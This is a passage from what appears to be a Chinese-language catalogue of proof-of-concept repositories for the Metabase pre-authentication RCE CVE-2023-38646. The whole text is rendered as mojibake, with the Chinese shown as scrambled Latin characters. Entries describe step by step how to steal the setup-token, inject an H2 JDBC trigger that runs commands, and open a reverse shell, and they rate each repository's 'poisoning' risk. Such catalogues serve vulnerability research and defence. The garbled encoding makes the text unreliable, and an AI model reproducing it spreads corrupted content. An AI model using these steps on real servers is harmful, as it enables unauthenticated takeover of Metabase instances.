**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** MetabaseæœåŠ¡éœ€è¦å¯è®¿é—®ï¼Œæ— éœ€è®¤è¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´å­˜åœ¨äºMetabaseçš„setupæµç¨‹ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„JDBC URLæ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§:**
æä¾›çš„POCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒåŒ…å«ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š
1.  è·å–setup-tokenï¼šPOCé¦–å…ˆå°è¯•ä»`/api/session/properties`è·å–setup-tokenã€‚è¿™æ˜¯åˆ©ç”¨æ¼æ´çš„å‰æã€‚ä»æ¼æ´ä¿¡æ¯æ¥çœ‹ï¼Œè¿™ä¸ªæ¥å£ä¸éœ€è¦èº«ä»½éªŒè¯ã€‚
2.  æ„é€ Payloadï¼šPOCæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„JDBC URLçš„JSON payloadã€‚è¯¥URLåˆ©ç”¨H2æ•°æ®åº“çš„`CREATE TRIGGER`åŠŸèƒ½æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å‘½ä»¤çš„æ‰§è¡Œæ˜¯é€šè¿‡è°ƒç”¨`java.lang.Runtime.getRuntime().exec()`å®ç°çš„ã€‚POCä¸­é»˜è®¤æ‰§è¡Œ`touch /tmp/success`ï¼Œè¿™æ˜¯ä¸€ä¸ªæ— å®³çš„å‘½ä»¤ï¼Œç”¨äºéªŒè¯æ¼æ´çš„å­˜åœ¨ã€‚
3.  å‘é€Payloadï¼šPOCå°†æ„é€ çš„payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ã€‚å¦‚æœæœåŠ¡å™¨è¿”å›åŒ…å«"Error creating or initializing trigger"çš„å“åº”ï¼Œåˆ™è¡¨æ˜æ¼æ´åˆ©ç”¨æˆåŠŸã€‚

**æŠ•æ¯’é£é™©:**
è™½ç„¶POCçš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£é™©ã€‚ä»¥ä¸‹æ˜¯åˆ†æï¼š
1. **`custom_base64_encode`å‡½æ•°:** è¿™ä¸ªå‡½æ•°å­˜åœ¨è¢«æ»¥ç”¨çš„å¯èƒ½ã€‚è™½ç„¶å…¶ç›®çš„æ˜¯å¯¹å‘½ä»¤è¿›è¡Œç¼–ç ï¼Œä½†å¦‚æœç”¨äºç¼–ç æ¶æ„è„šæœ¬å¹¶æ‰§è¡Œï¼Œåˆ™ä¼šäº§ç”Ÿå®‰å…¨é—®é¢˜ã€‚
2. **å‘½ä»¤æ‰§è¡Œ:** POCä¸­ä½¿ç”¨`java.lang.Runtime.getRuntime().exec()`æ‰§è¡Œå‘½ä»¤ã€‚è¿™æœ¬èº«å°±å¾ˆå±é™©ï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»»ä½•å‘½ä»¤ï¼ŒåŒ…æ‹¬ä¸‹è½½å’Œæ‰§è¡Œæ¶æ„è„šæœ¬ã€‚
3. **é»˜è®¤å‘½ä»¤:** è™½ç„¶POCé»˜è®¤æ‰§è¡Œçš„æ˜¯`touch /tmp/success`ï¼Œä½†æ”»å‡»è€…å¯ä»¥å¾ˆå®¹æ˜“åœ°ä¿®æ”¹`-c`å‚æ•°æ¥æ‰§è¡Œä»»ä½•å…¶ä»–å‘½ä»¤ã€‚å¦‚æœPOCè¢«åˆ†å‘å¹¶è¢«ç¼ºä¹ç»éªŒçš„ç”¨æˆ·ä½¿ç”¨ï¼Œä»–ä»¬å¯èƒ½ä¼šç›´æ¥æ‰§è¡Œæ”»å‡»è€…æä¾›çš„æ¶æ„å‘½ä»¤ã€‚

ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©ä¸»è¦åœ¨äºä½¿ç”¨è€…å¯èƒ½å—åˆ°æ¶æ„å‘½ä»¤çš„å½±å“ã€‚`custom_base64_encode`å‡½æ•°å’Œå‘½ä»¤æ‰§è¡Œæœºåˆ¶ä¹Ÿä¸ºæ½œåœ¨çš„æ¶æ„è¡Œä¸ºæä¾›äº†å¯èƒ½æ€§ã€‚é£é™©è¯„ä¼°ä¸º 10%ï¼Œä¸»è¦æ¥æºäºä½¿ç”¨è€…æ²¡æœ‰å®‰å…¨æ„è¯†ï¼Œç›´æ¥æ‰§è¡Œäº†æ¶æ„å‘½ä»¤ï¼Œæˆ–è€…ä»£ç åº“çš„ä¸‹è½½æºè¢«æ›¿æ¢ã€‚

**åˆ©ç”¨æ–¹å¼:**
1.  æ”»å‡»è€…é¦–å…ˆå‘`/api/session/properties`å‘é€GETè¯·æ±‚ä»¥è·å–setup-tokenã€‚
2.  ç„¶åï¼Œæ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„JDBC URLçš„JSON payloadã€‚æ¶æ„JDBC URLåˆ©ç”¨H2æ•°æ®åº“çš„`CREATE TRIGGER`åŠŸèƒ½æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºä¸€ä¸ªåœ¨`INFORMATION_SCHEMA.TABLES`ä¸Šè§¦å‘çš„triggerï¼Œå¹¶åœ¨è§¦å‘æ—¶æ‰§è¡ŒJavaä»£ç ã€‚Javaä»£ç è°ƒç”¨`java.lang.Runtime.getRuntime().exec()`æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
3.  æ”»å‡»è€…å°†æ„é€ çš„payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ã€‚
4.  å¦‚æœæœåŠ¡å™¨æˆåŠŸåˆ›å»ºäº†triggerï¼Œåˆ™æ”»å‡»æˆåŠŸï¼Œæ”»å‡»è€…æ‰§è¡Œçš„å‘½ä»¤å°†åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [CN016/Metabase-H2-CVE-2023-38646-](https://github.com/CN016/Metabase-H2-CVE-2023-38646-)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #6

**æ¥æº**: [CVE-2023-38646-DaniTheHack3r_CVE-2023-38646.md](../2023/CVE-2023-38646-DaniTheHack3r_CVE-2023-38646.md)

## CVE-2023-38646 Metabase RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯å³å¯æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯ç½‘ç»œè®¿é—®ï¼Œä¸”ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œæ­¤æ¼æ´çš„ä¸¥é‡ç¨‹åº¦ä¸ºé«˜å±ï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥å®Œå…¨æ§åˆ¶å—å½±å“çš„æœåŠ¡å™¨ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Token:** POCä»£ç é¦–å…ˆå°è¯•ä» `[TARGET_URL]/api/session/properties` è·å– setup-tokenã€‚
2.  **æ„é€  Payload:** åˆ©ç”¨è·å–åˆ°çš„tokenï¼ŒPOCæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ payloadã€‚è¯¥å­—ç¬¦ä¸²ä¸­åŒ…å«å¯æ‰§è¡Œå‘½ä»¤ï¼ˆé€šè¿‡ `COMMAND` å‚æ•°ä¼ å…¥ï¼‰ï¼Œé€šå¸¸é€šè¿‡ Base64 ç¼–ç è¿›è¡Œæ··æ·†ã€‚
3.  **å‘é€ Payload:** æ„é€ å¥½çš„payloadä¼šè¢«å‘é€åˆ° Metabase æœåŠ¡å™¨ï¼Œåˆ©ç”¨å…¶å¯¹æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²å¤„ç†ä¸å½“çš„æ¼æ´ï¼Œæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ã€‚
4.  **å‘½ä»¤æ‰§è¡Œ:**  é€šè¿‡åˆ›å»ºè§¦å‘å™¨å’Œåˆ©ç”¨H2æ•°æ®åº“ç‰¹æ€§ï¼Œå®ç°åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æ ¹æ®æ¼æ´æè¿°ã€æœç´¢å¼•æ“ç»“æœï¼ˆä¾‹å¦‚ï¼Œ[https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646/](https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646/) ï¼‰å’ŒPOCä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨çš„æœ‰æ•ˆæ€§è¾ƒé«˜ã€‚å¤šä¸ªæ¥æºè¡¨æ˜ï¼Œè¯¥æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**

POCä»£ç ä¸­å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´æ‰§è¡Œå‘½ä»¤ï¼Œä½†ä»£ç ä¸­å­˜åœ¨ä»¥ä¸‹æ½œåœ¨çš„é£é™©ç‚¹ï¼š

*   **è‡ªå®šä¹‰ Base64 ç¼–ç :**  `CustomBase64Encode` å‡½æ•°ä½¿ç”¨è‡ªå®šä¹‰çš„ Base64 ç¼–ç æ–¹å¼ï¼Œè™½ç„¶ç›®çš„æ˜¯ä¸ºäº†ç¬¦åˆæ¼æ´åˆ©ç”¨çš„è¦æ±‚ï¼Œä½†ä¹Ÿå¯èƒ½è¢«ç”¨æ¥éšè—æ¶æ„ä»£ç ã€‚
*   **Payload æ„é€ :** Payloadçš„æ„é€ è¿‡ç¨‹æ¯”è¾ƒå¤æ‚ï¼Œæ”»å‡»è€…å¯èƒ½åœ¨payloadä¸­åµŒå…¥é¢å¤–çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚ï¼Œåœ¨è¿æ¥å­—ç¬¦ä¸²ä¸­æ·»åŠ é¢å¤–çš„å‚æ•°ï¼Œä»¥ä¾¿åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚
*   **ä»£ç†è®¾ç½®:** æ¶æ„æ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡ä»£ç†æœåŠ¡å™¨å‘èµ·æ”»å‡», ä»è€Œéšè—è‡ªå·±çš„èº«ä»½ä¿¡æ¯.

å°½ç®¡å¦‚æ­¤ï¼Œæ ¹æ®ä»£ç æœ¬èº«ï¼Œå¤§éƒ¨åˆ†ä»£ç æ˜¯ç”¨äºå®ç°æ¼æ´åˆ©ç”¨åŠŸèƒ½çš„ï¼ŒæŠ•æ¯’çš„å¯èƒ½æ€§ç›¸å¯¹è¾ƒä½ï¼Œä¼°è®¡åœ¨10%å·¦å³ã€‚éœ€è¦äººå·¥å®¡æ ¸Payloadæ„é€ éƒ¨åˆ†ã€‚


**é¡¹ç›®åœ°å€:** [DaniTheHack3r/CVE-2023-38646](https://github.com/DaniTheHack3r/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #7

**æ¥æº**: [CVE-2023-38646-Ego1stoo_CVE-2023-38646.md](../2023/CVE-2023-38646-Ego1stoo_CVE-2023-38646.md)

## CVE-2023-38646 Metabase Pre-Auth RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source before 0.46.6.1 å’Œ Metabase Enterprise before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ Metabase å®ä¾‹éœ€è¦è¿è¡Œåœ¨å—å½±å“çš„ç‰ˆæœ¬èŒƒå›´å†…ï¼Œå¹¶ä¸”æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—®åˆ°è¯¥å®ä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´çš„åˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š

1.  **æ¼æ´åŸç†ï¼š** Metabase å­˜åœ¨ä¸€ä¸ªæœªæˆæƒçš„ `/api/setup/validate` æ¥å£ï¼Œè¯¥æ¥å£ç”¨äºåœ¨ Metabase é¦–æ¬¡è®¾ç½®æ—¶éªŒè¯æ•°æ®åº“è¿æ¥ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¥å£ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚
2.  **åˆ©ç”¨æ­¥éª¤ï¼š**
    *   é¦–å…ˆï¼Œæ”»å‡»è€…è®¿é—® Metabase å®ä¾‹çš„æ ¹è·¯å¾„ï¼Œè·å– `setup-token`ã€‚è¿™ä¸ªtokenè¢«åµŒå…¥åœ¨HTMLå“åº”çš„JavaScriptä»£ç ä¸­ï¼Œç”¨äºåç»­çš„è®¾ç½®è¿‡ç¨‹ã€‚
    *   ç„¶åï¼Œæ”»å‡»è€…å‘ `/api/setup/validate` æ¥å£å‘é€ POST è¯·æ±‚ï¼Œè¯·æ±‚ä½“åŒ…å«ä¸€ä¸ªæ¶æ„çš„ JSON å¯¹è±¡ã€‚è¿™ä¸ª JSON å¯¹è±¡çš„ `details.details.db` å­—æ®µåŒ…å«ä¸€ä¸ªç‰¹åˆ¶çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¿™ä¸ªè¿æ¥å­—ç¬¦ä¸²ä¸­åµŒå…¥äº†æ¶æ„ä»£ç ï¼Œåˆ©ç”¨ H2 æ•°æ®åº“çš„ `TRACE_LEVEL_SYSTEM_OUT` å’Œ `CREATE TRIGGER` åŠŸèƒ½æ¥æ‰§è¡Œä»»æ„çš„ shell å‘½ä»¤ã€‚
    *   POCä»£ç æ„é€ äº†ä¸€ä¸ªåå¼¹shellçš„payloadï¼Œå°†ç›®æ ‡æœºå™¨ä¸Šçš„è¾“å…¥è¾“å‡ºé‡å®šå‘åˆ°æ”»å‡»è€…æ§åˆ¶çš„æœºå™¨ä¸Šï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
3.  **æŠ•æ¯’é£é™©åˆ†æï¼š**
    è™½ç„¶æä¾›çš„ä»£ç ä¸»è¦æ˜¯ç”¨äºæ¼æ´åˆ©ç”¨ï¼Œä½†ä»å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£é™©ã€‚é£é™©ç‚¹ä¸»è¦å­˜åœ¨äº`CVE-2023-38646.py`è„šæœ¬ä¸­çš„`payload`å˜é‡ã€‚å½“å‰çš„`payload`ç”¨äºåˆ›å»ºä¸€ä¸ªåå‘shellè¿æ¥ï¼Œè™½ç„¶æœ¬èº«ä¸æ˜¯æ¶æ„ä»£ç ï¼Œä½†å¯èƒ½è¢«ä¿®æ”¹ä¸ºæ‰§è¡Œæ›´å…·ç ´åæ€§çš„æ“ä½œã€‚å¦å¤–ï¼Œä½œè€…æä¾›çš„githubé“¾æ¥ä¸­çš„å›¾ç‰‡å¯èƒ½æ˜¯ç»è¿‡ä¿®æ”¹çš„ã€‚
    æ€»ä½“è€Œè¨€ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä½†éœ€è¦ä»”ç»†å®¡æŸ¥ä»£ç ï¼Œç¡®ä¿å…¶æ²¡æœ‰è¢«ç¯¡æ”¹æˆ–æ·»åŠ æ¶æ„åŠŸèƒ½ã€‚


**é¡¹ç›®åœ°å€:** [Ego1stoo/CVE-2023-38646](https://github.com/Ego1stoo/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #8

**æ¥æº**: [CVE-2023-38646-JayRyz_CVE-2023-38646-PoC-Metabase.md](../2023/CVE-2023-38646-JayRyz_CVE-2023-38646-PoC-Metabase.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹è¿è¡Œåœ¨å—å½±å“ç‰ˆæœ¬ï¼Œä¸”ç½‘ç»œå¯è¾¾ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œæ­¤æ¼æ´å½±å“Metabaseå¼€æºç‰ˆæœ¬ä½äº0.46.6.1å’ŒMetabaseä¼ä¸šç‰ˆæœ¬ä½äº1.46.6.1ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Tokenï¼š** åˆ©ç”¨ PoC ä»£ç ä¸­çš„ `get_token` å‡½æ•°ï¼Œé€šè¿‡è®¿é—® `/api/session/properties` æ¥å£è·å– setup-tokenã€‚
2.  **æ„é€ æ¶æ„Payloadï¼š** åˆ©ç”¨è·å–çš„ setup-token, æ„é€ åŒ…å«æ¶æ„å‘½ä»¤çš„payloadã€‚PoC ä»£ç ä½¿ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­åµŒå…¥æ¶æ„ SQL è¯­å¥ï¼Œè¯¥è¯­å¥åˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼ˆTRIGGERï¼‰ï¼Œåœ¨è§¦å‘å™¨ä¸­æ‰§è¡Œå‘½ä»¤ã€‚å‘½ä»¤ä½¿ç”¨äº†åå¼¹shellçš„æŠ€æœ¯ã€‚ é¦–å…ˆå°†è¦æ‰§è¡Œçš„shellå‘½ä»¤è¿›è¡Œbase64ç¼–ç , ç„¶ååˆ©ç”¨`java.lang.Runtime.getRuntime().exec()` æ¥æ‰§è¡Œå‘½ä»¤ã€‚
3.  **å‘é€Exploitï¼š** é€šè¿‡ POST è¯·æ±‚å°†æ„é€ çš„ payload å‘é€åˆ° Metabase æœåŠ¡å™¨ã€‚
4.  **åå¼¹ Shellï¼š** æ”»å‡»è€…ä½¿ç”¨ `nc` ç›‘å¬æŒ‡å®šç«¯å£ï¼Œç­‰å¾…ç›®æ ‡æœåŠ¡å™¨æ‰§è¡Œå‘½ä»¤ååå¼¹ shellã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æä¾›çš„æ¼æ´ä¿¡æ¯å’ŒPoCä»£ç ï¼Œæ­¤æ¼æ´çš„åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´åº“ä¿¡æ¯æ˜ç¡®æŒ‡å‡ºæ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨æ­¤æ¼æ´æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æœç´¢å¼•æ“ç»“æœä¸­ä¹ŸåŒ…å«å¤§é‡å…³äºæ­¤æ¼æ´çš„åˆ†æå’Œåˆ©ç”¨æ–‡ç« ï¼Œè¿›ä¸€æ­¥éªŒè¯äº†å…¶æœ‰æ•ˆæ€§ã€‚PoCä»£ç æä¾›äº†è‡ªåŠ¨åŒ–åˆ©ç”¨çš„è„šæœ¬ã€‚

**æŠ•æ¯’é£é™©ï¼š**

æä¾›çš„ PoC ä»£ç ä¸­å­˜åœ¨æ½œåœ¨çš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†ä»£ç ä¸­å¯èƒ½åŒ…å«ä»¥ä¸‹æ½œåœ¨é£é™©ï¼š

*   **åå¼¹ Shell åœ°å€ï¼š** PoC ä»£ç å…è®¸ç”¨æˆ·æŒ‡å®šåå¼¹ shell çš„ IP åœ°å€å’Œç«¯å£ï¼Œä½†å¦‚æœç”¨æˆ·ä¸å°å¿ƒä½¿ç”¨äº†æ”»å‡»è€…æ§åˆ¶çš„ IP åœ°å€å’Œç«¯å£ï¼Œå¯èƒ½ä¼šè¢«åå¼¹ shellï¼Œå¯¼è‡´è‡ªèº«ç³»ç»Ÿè¢«æ”»å‡»è€…æ§åˆ¶ã€‚
*   **å…¶ä»–æ¶æ„å‘½ä»¤ï¼š**  æ”»å‡»è€…å¯èƒ½ä¼šä¿®æ”¹ PoC ä»£ç ï¼Œæ·»åŠ é¢å¤–çš„æ¶æ„å‘½ä»¤ï¼Œä¾‹å¦‚åˆ é™¤æ–‡ä»¶ã€ä¿®æ”¹ç³»ç»Ÿé…ç½®ç­‰ã€‚ä»£ç ä¸­çš„`convert_command`å‡½æ•°å’Œ`create_payload`å‡½æ•°å¯ä»¥è¢«ä¿®æ”¹æ³¨å…¥æ¶æ„ä»£ç ã€‚
*   **ä¾èµ–é¡¹é£é™©ï¼š** è™½ç„¶PoCä»£ç ä¾èµ–çš„requestsåº“æœ¬èº«é£é™©è¾ƒä½ï¼Œä½†æ˜¯å¦‚æœæ”»å‡»è€…æä¾›ä¿®æ”¹è¿‡çš„poc,å¢åŠ å…¶ä»–æ¶æ„ä¾èµ–åº“, å¯èƒ½ä¼šå­˜åœ¨å®‰å…¨é£é™©ã€‚

ç»¼åˆåˆ†æï¼ŒæŠ•æ¯’é£é™©è¯„ä¼°ä¸º 10%ï¼Œä¸»è¦é£é™©é›†ä¸­åœ¨ç”¨æˆ·é”™è¯¯ä½¿ç”¨æˆ–æ¶æ„ä¿®æ”¹ PoC ä»£ç çš„å¯èƒ½æ€§ä¸Šã€‚

**é¡¹ç›®åœ°å€:** [JayRyz/CVE-2023-38646-PoC-Metabase](https://github.com/JayRyz/CVE-2023-38646-PoC-Metabase)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #9

**æ¥æº**: [CVE-2023-38646-Mrunalkaran_CVE-2023-38646.md](../2023/CVE-2023-38646-Mrunalkaran_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Metabase open source versions before 0.46.6.1 and Metabase Enterprise versions before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹è¿è¡Œåœ¨å—å½±å“çš„ç‰ˆæœ¬ï¼Œä¸”ç½‘ç»œå¯è¾¾ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646æ˜¯ä¸€ä¸ªå­˜åœ¨äºMetabase 0.46.6.1ä¹‹å‰ç‰ˆæœ¬å’ŒMetabase Enterprise 1.46.6.1ä¹‹å‰ç‰ˆæœ¬çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ”»å‡»è€…æ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨æ­¤æ¼æ´ï¼Œé€šè¿‡ç²¾å¿ƒæ„é€ çš„è¯·æ±‚ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä»è€Œå®Œå…¨æ§åˆ¶ç³»ç»Ÿã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Token:** POCè„šæœ¬é¦–å…ˆå°è¯•ä»`/api/session/properties`ç«¯ç‚¹è·å–setup-tokenï¼Œè¿™ä¸ªtokenç”¨äºåç»­çš„åˆ©ç”¨ã€‚
2.  **æ„é€ æ¶æ„Payload:**  è„šæœ¬æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„JSON payloadã€‚è¯¥è¿æ¥å­—ç¬¦ä¸²åˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨è¿æ¥æ—¶æ‰§è¡Œä»»æ„Javaä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªè§¦å‘å™¨ï¼Œåœ¨è®¿é—® `INFORMATION_SCHEMA.TABLES` è¡¨æ—¶æ‰§è¡Œä¸€æ®µ JavaScript ä»£ç ã€‚
3.  **æ‰§è¡Œå‘½ä»¤:**  JavaScript ä»£ç è°ƒç”¨ `java.lang.Runtime.getRuntime().exec()` æ¥æ‰§è¡Œä¸€ä¸ªåŒ…å«base64ç¼–ç çš„bashå‘½ä»¤ã€‚æ­¤å‘½ä»¤è§£ç å¹¶æ‰§è¡Œåå‘shellå‘½ä»¤ã€‚
4.  **å‘é€Payload:**  æ„é€ å¥½çš„payloadé€šè¿‡POSTè¯·æ±‚å‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ã€‚
5.  **åå‘Shell:**  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼Œæ”»å‡»è€…å°†åœ¨æŒ‡å®šçš„IPåœ°å€å’Œç«¯å£ä¸Šè·å¾—ä¸€ä¸ªåå‘shellã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

